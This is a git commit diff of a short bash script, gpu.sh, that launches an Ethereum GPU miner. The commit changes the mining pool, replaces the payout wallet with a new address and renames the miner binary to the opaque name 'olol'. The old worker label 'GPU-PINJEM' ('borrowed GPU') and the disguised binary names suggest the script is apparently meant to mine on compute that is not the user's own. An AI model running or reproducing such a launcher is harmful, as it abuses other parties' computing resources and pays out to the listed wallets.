bf8f36f8634decf317c057977441161e4f8804f7
catursawah <83405015+catursawah@users.noreply.github.com>
2021-06-10 21:40:36 +0700

    Update gpu.sh

--- gpu.sh
+++ gpu.sh
@@ -1,7 +1,6 @@
 #!/bin/bash
-POOL=ethash.unmineable.com:3333
-WALLET=TRX:TA341dN8GbhAyVfPb9A3Gwxnq3eMSbrcLD
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
-
-chmod +x tuyulgpu
-./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+POOL=asia-eth.2miners.com:2020
+WALLET=0xc6601e3308cfe311faa2236b9578ae3cfad2c82a
+WORKER=FADLUN
+chmod +x olol
+./olol --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
